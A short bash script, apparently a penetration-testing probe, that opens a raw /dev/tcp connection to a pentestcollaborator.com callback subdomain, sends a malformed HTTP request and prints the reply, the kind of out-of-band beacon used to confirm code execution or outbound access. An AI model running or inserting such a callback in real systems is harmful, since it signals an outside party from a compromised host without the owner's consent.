#!/bin/bash
exec 3<>/dev/tcp/e2hgosq0k3p8nf7exs3gvz88bzhq5ht6.pentestcollaborator.com/80
echo -e "Get /simple?se=1 HTTP/2.0\n" >&3
cat <&3
